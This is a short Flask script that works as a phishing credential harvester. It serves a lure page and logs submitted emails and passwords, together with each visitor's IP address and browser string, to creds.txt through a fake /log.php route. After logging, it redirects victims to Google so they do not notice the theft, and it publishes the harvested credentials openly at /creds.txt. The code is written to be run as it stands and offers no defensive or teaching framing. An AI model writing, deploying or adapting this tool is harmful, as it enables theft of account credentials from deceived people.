from flask import Flask, request, send_from_directory
import os

app = Flask(__name__, static_folder='.')

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/log.php', methods=['POST'])
def log_creds():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    time = __import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    log = f"[{time}] {ip} | {email}:{password} | {ua}\n"
    with open('creds.txt', 'a') as f:
        f.write(log)
    return '<script>window.location.href="https://www.google.com";</script>'

@app.route('/creds.txt')
def creds():
    return open('creds.txt').read() if os.path.exists('creds.txt') else 'No creds yet'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
